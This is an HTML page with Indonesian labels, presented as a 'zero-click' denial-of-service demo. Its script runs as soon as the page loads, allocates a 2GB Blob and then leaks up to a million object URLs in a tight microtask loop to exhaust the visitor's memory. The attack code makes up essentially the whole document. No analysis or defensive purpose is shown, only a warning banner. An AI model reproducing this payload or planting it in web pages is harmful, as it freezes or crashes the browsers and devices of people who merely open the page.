<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Zero-Click Memory Exhaustion</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
.panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; animation: pulse 0.5s infinite; }
p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
#status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
.warning { background: #331111; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ff4444; }
.log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
</style>
</head>

<body>
<div class="panel" id="main-panel">
    <div class="warning">⚠️ PERINGATAN: Halaman ini akan langsung memicu Memory Exhaustion saat dibuka!</div>
    <h1>Zero-Click DoS</h1>
    <p>Membuat Blob raksasa dan jutaan ObjectURL tanpa henti.</p>
    
    <div id="status" role="status">Memuat halaman...</div>
    <div class="log" id="log">Log akan muncul di sini...</div>
</div>

<script>
    const statusDiv = document.getElementById("status");
    const logDiv = document.getElementById("log");

    function log(msg) {
        logDiv.innerHTML += "<br>> " + msg;
        console.log(msg);
    }

    // FUNGSI ZERO-CLICK: Langsung eksekusi saat halaman dimuat
    window.addEventListener("DOMContentLoaded", () => {
        statusDiv.textContent = "MEMULAI SERANGAN DoS...";
        statusDiv.style.color = "#ff4444";
        log("Halaman dimuat. Memulai alokasi memori masif...");

        // --- SERANGAN 1: Blob Raksasa (2GB) ---
        try {
            const sizeInBytes = 2 * 1024 * 1024 * 1024; // 2GB
            const buffer = new ArrayBuffer(sizeInBytes);
            const blob = new Blob([buffer], { type: 'application/octet-stream' });
            const url = URL.createObjectURL(blob);
            
            // Simpan di global agar tidak di-GC
            window.hugeBlob = blob;
            window.hugeBlobUrl = url;
            
            log("Blob 2GB berhasil dialokasikan.");
        } catch (e) {
            log("Gagal alokasi Blob 2GB: " + e.message);
        }

        // --- SERANGAN 2: Jutaan ObjectURL (Memory Leak) ---
        let count = 0;
        const targetCount = 1000000; // 1 Juta URL

        function createURL() {
            if (count >= targetCount) {
                statusDiv.textContent = "Selesai. Total URL: " + count;
                statusDiv.style.color = "#4CAF50";
                return;
            }

            try {
                // Buat Blob kecil (1KB)
                const blob = new Blob(["X".repeat(1024)], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                
                // Simpan URL di array global agar tidak di-GC (Memory Leak)
                window.urlLeak = window.urlLeak || [];
                window.urlLeak.push(url);
                
                count++;
                if (count % 10000 === 0) {
                    statusDiv.textContent = "Membuat URL ke-" + count;
                    log("URL ke-" + count + " dibuat.");
                }
                
                // Loop secepat mungkin
                queueMicrotask(createURL);
            } catch (e) {
                log("Gagal di URL ke-" + count + ": " + e.message);
                statusDiv.textContent = "Crash di URL ke-" + count;
                statusDiv.style.color = "#f00";
            }
        }

        // Mulai Memory Leak
        createURL();
    });
</script>
</body>
</html>
